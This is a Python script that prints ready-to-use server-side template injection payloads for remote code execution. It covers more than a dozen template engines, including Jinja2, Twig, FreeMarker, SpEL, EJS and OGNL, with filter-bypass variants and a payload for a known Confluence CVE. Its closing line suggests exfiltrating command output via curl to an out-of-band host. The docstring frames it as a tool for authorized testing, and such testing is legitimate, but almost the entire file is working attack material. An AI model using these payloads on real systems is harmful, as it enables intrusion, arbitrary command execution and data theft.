#!/usr/bin/env python3
"""
ssti_rce.py — print the engine-specific SSTI -> RCE payload(s) for a given engine and command.
For AUTHORIZED testing. Use a BENIGN marker command (id / whoami) first; clean up.
(SSTI_TESTING_GUIDE.md §7-§13.)

Usage:
  python3 ssti_rce.py --engine jinja2 --cmd id
  python3 ssti_rce.py --engine twig --cmd id
  python3 ssti_rce.py --list
"""
import argparse

def payloads(cmd):
    c = cmd.replace("'", "\\'")
    return {
        "jinja2": [
            f"{{{{ cycler.__init__.__globals__.os.popen('{c}').read() }}}}",
            f"{{{{ lipsum.__globals__.os.popen('{c}').read() }}}}",
            f"{{{{ request.application.__globals__.__builtins__.__import__('os').popen('{c}').read() }}}}",
            f"{{{{ get_flashed_messages.__globals__.__builtins__.__import__('os').popen('{c}').read() }}}}",
            "# secret (if RCE blocked): {{ config }}  /  {{ config['SECRET_KEY'] }}",
        ],
        "mako": [
            f"${{self.module.cache.util.os.system('{c}')}}",
            f"<%import os%>${{os.popen('{c}').read()}}",
        ],
        "tornado": [f"{{% import os %}}{{{{ os.popen('{c}').read() }}}}"],
        "twig": [
            f"{{{{ ['{c}']|filter('system') }}}}",
            f"{{{{ ['{c}',''] | sort('system') }}}}",
            f"{{{{ _self.env.registerUndefinedFilterCallback('exec') }}}}{{{{ _self.env.getFilter('{c}') }}}}",
            f"{{{{ attribute(_self.env, 'getFilter', ['system'])('{c}') }}}}",
        ],
        "smarty": [f"{{system('{c}')}}", f"{{php}}system('{c}');{{/php}}"],
        "freemarker": [
            f'<#assign ex="freemarker.template.utility.Execute"?new()>${{ ex("{c}") }}',
            f'${{"freemarker.template.utility.Execute"?new()("{c}")}}',
        ],
        "velocity": [
            f'#set($e="exec")#set($r=$class.inspect("java.lang.Runtime").type.getRuntime().exec("{c}"))$r',
        ],
        "spel": [
            f'${{T(java.lang.Runtime).getRuntime().exec("{c}")}}',
            f'${{T(java.lang.Runtime).getRuntime().exec(new String[]{{"/bin/sh","-c","{c}"}})}}',
        ],
        "thymeleaf": [f'__${{T(java.lang.Runtime).getRuntime().exec("{c}")}}__::.x'],
        "erb": [f"<%= `{c}` %>", f"<%= system('{c}') %>", f"<%= IO.popen('{c}').read %>"],
        "slim": [f"#{{`{c}`}}"],
        "ejs": [f"<%= global.process.mainModule.require('child_process').execSync('{c}') %>"],
        "pug": [
            f"#{{root.process.mainModule.require('child_process').execSync('{c}')}}",
            f"= global.process.mainModule.require('child_process').execSync('{c}')",
        ],
        "nunjucks": [
            f"{{{{ range.constructor(\"return global.process.mainModule.require('child_process').execSync('{c}')\")() }}}}",
        ],
        # Expression-Language injection (guide §8.4) — Struts/Confluence/JSF (match the product+version to a published CVE PoC)
        "ognl": [
            f"%{{(#a=@java.lang.Runtime@getRuntime().exec('{c}'))}}",
            f"'%2b#{{@java.lang.Runtime@getRuntime().exec(\"{c}\")}}%2b'   (Confluence CVE-2021-26084 queryString)",
        ],
        "el": [
            f"${{''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'{c}')}}",
        ],
        # Jinja2 filter/WAF bypass (guide §11.1) — blocked keyword smuggled via request.args (?g=__globals__)
        "jinja2_bypass": [
            f"{{{{ lipsum|attr(request.args.g)|attr('os')|attr('popen')('{c}')|attr('read')() }}}}   # send ?g=__globals__",
            f"{{% print(cycler|attr(request.args.g)) %}}   # statement context when {{{{ }}}} is blocked; ?g=__init__",
        ],
    }

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--engine")
    ap.add_argument("--cmd", default="id")
    ap.add_argument("--list", action="store_true")
    a = ap.parse_args()
    p = payloads(a.cmd)
    if a.list or not a.engine:
        print("engines:", ", ".join(sorted(p)))
        if not a.engine:
            return
    eng = a.engine.lower()
    if eng not in p:
        print(f"[!] unknown engine '{eng}'. known: {', '.join(sorted(p))}")
        return
    print(f"# {eng} RCE payloads for cmd={a.cmd!r}  (BENIGN marker first; URL-encode for the request; clean up)\n")
    for pl in p[eng]:
        print(pl)
    print("\n# blind? wrap the command in a curl/sleep to your OOB host and exfil $(whoami) (§13).")

if __name__ == "__main__":
    main()
